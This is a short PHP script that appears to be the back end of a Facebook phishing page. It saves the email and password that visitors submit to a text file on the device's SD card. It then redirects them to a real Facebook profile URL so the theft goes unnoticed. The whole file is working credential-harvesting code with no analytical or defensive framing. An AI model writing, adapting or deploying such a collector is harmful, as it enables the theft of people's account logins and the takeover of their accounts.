<?php

file_put_contents("/sdcard/usernames.txt", "[EMAIL]: " . $_POST['email'] . " [PASS]: " . $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://m.facebook.com/profile.php?id=100047231083339');

exit();
